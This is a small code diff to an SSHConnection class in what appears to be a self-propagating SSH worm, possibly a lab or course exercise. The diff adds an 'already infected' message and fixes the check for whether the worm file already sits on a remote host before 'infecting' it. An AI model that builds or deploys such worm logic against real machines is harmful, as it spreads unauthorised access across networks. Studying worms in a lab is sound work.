@@ -165,6 +165,8 @@ class SSHConnection:
                 if self.check_if_marked():
                     print ("[+] Infecting %s" % (host))
                     return host
+                else:
+                    print ("[!] %s already infected" % (host))
             else:
                 self.ssh_connection.close()
         # No host found
@@ -177,7 +179,7 @@ class SSHConnection:
         #stdin, stdout, stderr = self.ssh_connection.exec_command("ls " + self.target_dir, timeout=10)
         #results = stdout.readlines()
         results = sftp.listdir()
-        #results = [str(name) for name in results]
+        results = [str(name) for name in results]
         #results = [name[0:-1] for name in results]
         return self.worm_file not in results
 
